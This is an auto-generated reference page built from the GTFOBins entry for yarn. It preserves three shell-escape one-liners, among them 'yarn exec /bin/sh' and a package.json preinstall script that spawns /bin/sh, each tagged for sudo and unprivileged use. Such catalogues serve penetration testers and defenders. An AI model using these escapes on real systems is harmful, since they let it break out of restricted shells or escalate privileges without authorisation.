---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# yarn

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `yarn` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yarn` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [yarn](../../tools/linux/yarn.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | yarn |
| name | yarn |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/yarn/ |

## Preserved Source Material

```yaml
_body: ''
_name: yarn
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yarn
functions:
  shell:
  - code: yarn exec /bin/sh
    contexts:
      sudo: null
      unprivileged: null
  - code: 'echo ''{"scripts": {"preinstall": "/bin/sh"}}'' >package.json

      yarn --cwd .'
    contexts:
      sudo: null
      unprivileged: null
  - code: 'echo ''{"scripts": {"xxx": "/bin/sh"}}'' >package.json

      yarn --cwd . xxx'
    contexts:
      sudo: null
      unprivileged: null
```
